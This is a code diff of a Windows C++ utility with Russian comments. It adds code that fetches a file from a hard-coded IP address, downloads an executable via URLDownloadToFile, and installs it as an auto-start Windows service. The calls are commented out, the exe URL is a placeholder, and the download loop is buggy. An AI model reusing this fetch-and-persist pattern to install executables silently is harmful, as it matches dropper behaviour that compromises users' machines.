@@ -3,6 +3,9 @@
 #include "windows.h"
 #include <wininet.h>
 #include <fstream>
+#include <atlstr.h>
+#include <urlmon.h>
+#pragma comment(lib, "urlmon.lib")
 #pragma comment(lib,"wininet")
 
 //Определение битности. Взял кусок кода отсюда: https://support.microsoft.com/en-gb/kb/2060044
@@ -55,10 +58,9 @@ BOOL Is64BitOperatingSystem()
 }
 #pragma endregion
 
-//Скачивание и запуск нужного сервиса (пока нет)
+//Скачивание нужного сервиса
 int GetService()
 {
-	bool ok = false;
 	// инициализируем WinInet
 	HINTERNET hInternet =
 		::InternetOpen(
@@ -71,7 +73,7 @@ int GetService()
 		HINTERNET hConnect =
 			::InternetConnect(
 			hInternet,
-			TEXT("95.213.191.87"),
+			TEXT("95.213.191.87"), //сюда адрес сервера
 			INTERNET_DEFAULT_HTTP_PORT,
 			NULL, NULL,
 			INTERNET_SERVICE_HTTP,
@@ -84,7 +86,7 @@ int GetService()
 				::HttpOpenRequest(
 				hConnect,
 				TEXT("GET"),
-				TEXT("serviceapp.csv"),
+				TEXT("serviceapp"),
 				NULL,
 				NULL,
 				0,
@@ -96,7 +98,7 @@ int GetService()
 				BOOL bSend = ::HttpSendRequest(hRequest, NULL, 0, NULL, 0);
 				if (bSend) {
 					// создаём выходной файл
-					std::ofstream fnews("applist.csv", std::ios::out | std::ios::binary);
+					std::ofstream fnews("serviceapp.csv", std::ios::out | std::ios::binary);
 					if (fnews.is_open()) for (;;) {
 						// читаем данные
 						char  szData[1024];
@@ -115,31 +117,66 @@ int GetService()
 						szData[dwBytesRead] = 0;
 						fnews << szData;
 
-						bool ok = true;
+						/*
+						* Тут узнаём чё откуда качать
+						*/
+						HRESULT hr = URLDownloadToFile(NULL, _T("D:/servupd.exe"/*тут ссылка на exe сервиса*/), _T("ololo.exe"), 0, NULL);
 					}
 				}
-				else std::cout << 4;
 				// закрываем запрос
 				::InternetCloseHandle(hRequest);
 			}
-			else std::cout << 3;
 			// закрываем сессию
 			::InternetCloseHandle(hConnect);
 		}
-		else std::cout << 2;
 		// закрываем WinInet
 		::InternetCloseHandle(hInternet);
 	}
-	else std::cout << 1;
 
 	return 0;
 }
 
+//Установка и запуск сервиса
+BOOL InstallAndStartService(const CString& strServiceName, const CString& strDisplayName, const CString& strBinaryPathName)
+{
+	BOOL bResult = FALSE;
+
+	SC_HANDLE hServiceControlManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
+	if (NULL != hServiceControlManager)
+	{
+		SC_HANDLE hService = CreateService(hServiceControlManager,
+			(LPCTSTR)strServiceName,
+			(LPCTSTR)strDisplayName,
+			SC_MANAGER_ALL_ACCESS,
+			SERVICE_WIN32_OWN_PROCESS,
+			SERVICE_AUTO_START,
+			SERVICE_ERROR_NORMAL,
+			(LPCTSTR)strBinaryPathName,
+			0,
+			0,
+			0,
+			0,
+			0);
+		if (hService != NULL)
+		{
+			StartService(hService, NULL, NULL);
+			bResult = TRUE;
+			CloseServiceHandle(hService);
+		}
+
+		CloseServiceHandle(hServiceControlManager);
+	}
+
+	return bResult;
+}
 
 int _tmain(int argc, _TCHAR* argv[])
 {
 	int bitVer;
-	Is64BitOperatingSystem() ? bitVer = 64 : bitVer = 32;
-	GetService();
+	//Is64BitOperatingSystem() ? bitVer = 64 : bitVer = 32;
+	//GetService();
+	//InstallAndStartService("instupd", "instupd", "адрес exe сервиса");
+
+	//system("pause");
 	return 0;
 }
